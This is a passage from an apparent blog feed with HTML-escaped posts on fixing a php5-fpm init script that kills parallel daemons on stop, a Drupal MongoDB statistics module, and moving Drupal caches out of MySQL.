 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;10731&lt;/span&gt;  0.1  2.7 &lt;span class=&quot;m&quot;&gt;699296&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;110940&lt;/span&gt; ?       S    May14   1:30  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; php-fpm: pool my-pool
 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;10816&lt;/span&gt;  0.1  2.4 &lt;span class=&quot;m&quot;&gt;688676&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;99048&lt;/span&gt; ?        S    May14   1:35  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; php-fpm: pool my-pool
 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;10817&lt;/span&gt;  0.1  2.5 &lt;span class=&quot;m&quot;&gt;694604&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;104196&lt;/span&gt; ?       S    May14   1:18  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; php-fpm: pool my-pool
 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;10912&lt;/span&gt;  0.1  2.6 &lt;span class=&quot;m&quot;&gt;696708&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;108364&lt;/span&gt; ?       S    May14   1:27  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; php-fpm: pool my-pool&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Watch the nice crash on start/stop&lt;/h3&gt;

&lt;p&gt;It's not the end!&lt;/p&gt;

&lt;p&gt;If you try to stop one of the 2 daemons you will have a long running stop, and then after 30s the 2 daemons will be down.
Redo the ps to see it.&lt;/p&gt;

&lt;p&gt;Problem is coming fom the &lt;code&gt;do_stop&lt;/code&gt; function in the init script:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Function that stops the daemon/service&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
do_stop&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;# Return&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#   0 if daemon has been stopped&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#   1 if daemon was already stopped&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#   2 if daemon could not be stopped&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#   other if a failure occurred&lt;/span&gt;
  start-stop-daemon --stop --quiet --retry&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;QUIT/&lt;span class=&quot;nv&quot;&gt;$TIMEOUT&lt;/span&gt;/TERM/5/KILL/5 --pidfile &lt;span class=&quot;nv&quot;&gt;$PIDFILE&lt;/span&gt; --name &lt;span class=&quot;nv&quot;&gt;$NAME&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;RETVAL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;$?&amp;quot;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;$RETVAL&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; 2
  &lt;span class=&quot;c&quot;&gt;# Wait for children to finish too if this is a daemon that forks&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;# and if the daemon is only ever run from this initscript.&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;# If the above conditions are not satisfied then add some other code&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;# that waits for the process to drop all resources that could be&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;# needed by services started subsequently.  A last resort is to&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;# sleep for some time.&lt;/span&gt;
  start-stop-daemon --stop --quiet --oknodo --retry&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0/30/TERM/5/KILL/5 --exec &lt;span class=&quot;nv&quot;&gt;$DAEMON&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;$?&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; 2
  &lt;span class=&quot;c&quot;&gt;# Many daemons don&amp;#39;t delete their pidfiles when they exit.&lt;/span&gt;
  rm -f &lt;span class=&quot;nv&quot;&gt;$PIDFILE&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;$RETVAL&amp;quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;start-stop-daemon&lt;/code&gt; command is a first stop on the right daemon, based on the pid.
But after that a second stop is running, ensuring no ghost
child stay alive, and this second &lt;code&gt;start-stop-daemon&lt;/code&gt; command is running with option &lt;code&gt;--exec&lt;/code&gt; :&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;−x, −−exec executable&lt;/p&gt;

&lt;p&gt;Check for processes that are instances of this executable (according to /proc/pid/exe).&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Let's see whet is this &lt;code&gt;/proc/pid/exe&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /var/run/php5-fpm.pid 
1246
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ls -alh /proc/1246/exe
lrwxrwxrwx &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;15&lt;/span&gt; mai   13:30 /proc/1246/exe -&amp;gt; /usr/sbin/php5-fpm&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So this second stop is waiting for &lt;strong&gt;any&lt;/strong&gt; process whose executable is &lt;code&gt;/usr/sbin/php5-fpm&lt;/code&gt;,
and if it do not stop after 30 seconds, a SIGTERM and then a SIGKILL is launched.
When stopping the php-fpm-test version every other parallel php-daemon running will finally get killed.
Same for the first daemon.&lt;/p&gt;

&lt;p&gt;That's not very nice.&lt;/p&gt;

&lt;h3&gt;Fix the stop/killal problems&lt;/h3&gt;

&lt;p&gt;First step, indicate a different binary in &lt;strong&gt;/etc/init.d/php5-fpm-test&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;-NAME&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php5-fpm
+NAME&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php5-fpm-test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then this binary should exists, doing a symbolic link from php5-fpm-test to php5-fpm will not fool
the  &lt;code&gt;/proc/pid/exe&lt;/code&gt; link. So one ugly solution is to make a real copy of the binary:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cp /usr/sbin/php5-fpm /usr/sbin/php5-fpm-test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;One caveat: when upgrading php5-fpm package you will have to redo this manual copy of the binary.&lt;/p&gt;

&lt;p&gt;One other solution is to comment the second start-stop-daemon line, but you'll get a less robust stop script.&lt;/p&gt;

&lt;p&gt;If you can think of a third solution send me an email.&lt;/p&gt;
</description>
				<published>2013-05-16 00:00:00 +0200</published>
				<link>http://regilero.github.io/drupal/english/2013/05/16/Warning_chrooted_php_fpm_and_apc/</link>
			</item>
		
			<item>
				<title>Drupal - Mongodb statistics module published</title>
				<description>&lt;h3&gt;What is this about?&lt;/h3&gt;

&lt;p&gt;Just a few words, as I've other some things to do.&lt;/p&gt;

&lt;p&gt;I've just published a development version of &lt;a href=&quot;http://github.com/regilero/drupal_mongodb_statistics&quot;&gt;mongodb-statistics&lt;/a&gt; on github.&lt;/p&gt;

&lt;p&gt;This module is a first try on replacing heavy MySQL operations done by the core statistics module.&lt;/p&gt;

&lt;p&gt;It's copy-and-alter of the core statistics module, with some additions.
So it's not the nicest piece of code I could write :-)&lt;/p&gt;

&lt;p&gt;On the things added :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;batch migration of previous node_counter statistics if any (not yet for accesslog)&lt;/li&gt;
&lt;li&gt;post-synchronisation of node_counter mongodb table to a sql table (via cron), so that you could query it via views (not for accesslog, are you mad?)&lt;/li&gt;
&lt;li&gt;time based caching of the popular content block&lt;/li&gt;
&lt;li&gt;Still lot of thing to do (see the &lt;a href=&quot;https://github.com/regilero/drupal_mongodb_statistics/blob/master/mongodb_statistics/TODO.txt&quot;&gt;TODO&lt;/a&gt;) but it was a nice way to learn &lt;strong&gt;mongodb&lt;/strong&gt;. I especially like the idea of &lt;a href=&quot;http://nosql.mypopescu.com/post/392418792/translate-sql-to-mongodb-mapreduce&quot;&gt;mapReduce&lt;/a&gt; functions applied for complex &lt;code&gt;GROUP BY&lt;/code&gt; equivalents.&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2011-10-18 00:00:00 +0200</published>
				<link>http://regilero.github.io/drupal/english/2011/10/18/drupal_mongodb_statistics_module_published/</link>
			</item>
		
			<item>
				<title>Separate cache Backends with Drupal6 and Drupal7.</title>
				<description>&lt;p&gt;Drupal use a lot of caches at different levels but all of them are by default stored in the database.&lt;/p&gt;

&lt;p&gt;In this article we'll study how to push all these caches in better places.&lt;/p&gt;

&lt;p&gt;This is a new feature of default Drupal7, but simple solutions are available if you want the same thing on a Drupal6 installation.&lt;/p&gt;

&lt;h3&gt;The default situation&lt;/h3&gt;

&lt;p&gt;Take your Drupal Database and check what are the cache tables used, here I'll use a quite basic default Drupal installation on Drupal6:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;cache%&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Tables_in_expat6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;cache&lt;/span&gt;                     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_block&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_content&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_filter&lt;/span&gt;              &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_form&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_menu&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_page&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_update&lt;/span&gt;              &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_views&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_views_data&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache_admin_menu&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's try to get more informations on theses tables with a query on the INFORMATION_SCHEMA of MySQL, here a database named mydrupal&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; 
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table_rows&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;K&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;indexes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idxfrac&lt;/span&gt; 
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TABLES&lt;/span&gt; 
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;cache%&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table_schema&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;&amp;quot;mydrupal&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;ORDER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index_length&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DESC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------+-------+-------+---------+------------+---------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbtable&lt;/span&gt;                   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;rows&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DATA&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;indexes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idxfrac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------+-------+-------+---------+------------+---------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_menu&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_form&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_update&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 